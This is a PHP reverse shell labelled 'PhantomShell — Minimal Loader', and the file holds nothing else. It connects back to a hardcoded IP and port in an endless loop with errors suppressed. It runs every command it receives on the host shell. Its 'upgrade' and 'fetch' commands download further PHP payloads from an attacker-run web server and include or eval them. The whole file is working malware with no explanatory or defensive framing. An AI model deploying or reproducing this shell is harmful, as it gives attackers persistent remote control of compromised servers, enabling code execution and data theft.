<?php
$ip='10.13.5.162';$port=4444;$url='http://'.$ip.':8888/';
set_time_limit(0);error_reporting(0);ignore_user_abort(true);
while(1){
    $s=@fsockopen($ip,$port,$en,$es,30);
    if($s){
        stream_set_timeout($s,0);
        @fwrite($s,"\n\033[1;35m[ PhantomShell — Minimal Loader ]\033[0m\n");
        @fwrite($s,"Type '\033[1;33mupgrade\033[0m' to load full features\n");
        @fwrite($s,"Type '\033[1;33mfetch <module>\033[0m' to load specific module\n\n> ");
        while(!feof($s)){
            $c=trim(@fgets($s,4096));
            if($c==='')continue;
            if($c==='exit'||$c==='quit')break;
            if($c==='upgrade'){
                $data=@file_get_contents($url.'phantom.php');
                if(!$data){$ctx=stream_context_create(array('http'=>array('timeout'=>10)));$data=@file_get_contents($url.'phantom.php',false,$ctx);}
                if($data&&strlen($data)>100){
                    $tmp=tempnam('/tmp','ph_');@file_put_contents($tmp,$data);
                    @fwrite($s,"\033[1;32m[+]\033[0m Full mode loaded (".strlen($data)." bytes). Restarting...\n");
                    @fclose($s);@include($tmp);@unlink($tmp);exit;
                }else @fwrite($s,"\033[1;31m[-]\033[0m Cannot fetch. Start: python3 -m http.server 8888\n");
            }elseif(strpos($c,'fetch ')===0){
                $mod=trim(substr($c,6));
                $data=@file_get_contents($url.'modules/'.$mod.'.php');
                if($data&&strlen($data)>10){eval('?>'.$data);@fwrite($s,"\033[1;32m[+]\033[0m Module '$mod' loaded\n");}
                else @fwrite($s,"\033[1;31m[-]\033[0m Module '$mod' not found\n");
            }else{
                $out=@shell_exec($c.' 2>&1');
                if($out===null){$out='';@exec($c.' 2>&1',$lines);$out=implode("\n",$lines);}
                @fwrite($s,$out."\n");
            }
            @fwrite($s,"> ");
        }
        @fclose($s);
    }
    sleep(5);
}
?>
